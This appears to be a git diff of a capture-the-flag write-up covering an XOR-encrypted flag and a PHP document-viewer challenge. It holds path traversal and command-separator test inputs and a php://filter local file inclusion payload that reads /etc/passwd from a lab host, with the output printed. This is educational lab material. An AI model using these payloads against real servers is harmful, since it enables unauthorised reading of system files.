@@ -25,7 +25,7 @@ encrypted = xor(flag, key)
 with open("encrypted.bin", "wb") as f:
 	f.write(encrypted)
 ```
-Hex code of encrypted.bin
+**Hex code of encrypted.bin:**
 ```
 $ xxd encrypted.bin 
 00000000: 9f86 8338 93fe bc1c 80fd b71c b9fd ad73  ...8...........s
@@ -112,7 +112,7 @@ Only .pdf and .png documents are served from this terminal.
 - ?doc= is likely being processed by a server-side script (PHP is plausible because /index.php exists, but not proven).
 - The application performs some extension validation:
 - ../../../etc/passwd → 403, displaying "Only .pdf and .png documents are served from this terminal. "
-- ../../../etc/passwd.pdf → 202, no output
+- ../../../etc/passwd.pdf → 202, nothing output (just allows and fails after filter).
 - The validation appears to care about the filename ending in .pdf or .png.
 - Command separators such as ;cat ... don't appear to be executed, which suggests this is probably a file-read operation rather than a shell command being built from user input. Using file name that should exist in place of cat command creates empty file download. 
 - That implies the application may be doing something similar to:
@@ -120,7 +120,9 @@ Only .pdf and .png documents are served from this terminal.
 PHP
 if (preg_match('/\.(pdf|png)$/', $doc))
 {
-// process file
+// superficial look for .pdf or .png 
+// process file or drop if not pdf|png file silently
+
 }
 else
 {
@@ -195,16 +197,44 @@ if ($doc !== '') {
 <title>VILLAGE ARCHIVE TERMINAL v2.3</title>
 ...
 ```
+Explains a lot, filters directory traversal, reads superficially for 3 letters in file name, sets directory path, begins download before it realises it can read the file that does not exist and fails.
+
+**php://filter is a PHP stream wrapper.** Think of it as a special PHP "virtual file path" that tells PHP:
+
+- "Before reading this resource, pass it through one or more filters."
+- Normal file read:
+```
+readfile("index.php");
+```
+reads: index.php, this used after doc?
+
+Wrapper read:
+
+```
+readfile("php://filter/convert.base64-encode/resource=index.php");
+```
+means:
+
+index.php
+↓
+base64 encode
+↓
+output encoded text
+
+The middle section there is where a filter to convert file is applied here to resource file index.php.
+
+Instead of getting the executed PHP page, you get something like:
+```
+PD9waHAKJGRvYyA9ICRfR0VUWydkb2MnXTsK...
+```
 Similarly its easy progression to see that altering that command its possible to obtain the passwd file with 
 ```
-http://10.64.130.163/?doc=php://filter/read=pdf/resource=/etc/passwd
+http://10.64.130.163/?doc=php://filter/resource=/etc/passwd
 ```
-This gave the usual passwd file but the one of most interest was ubuntu:x:1000:1000:/home/ubuntu:/bin/bash
+This gave the usual passwd file but the one of most interest was ubuntu:x:1000:1000:/home/ubuntu:/bin/bash.
 ```
 root:x:0:0:root:/root:/bin/bash
 ...
 ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
 ...
-
-
 ```
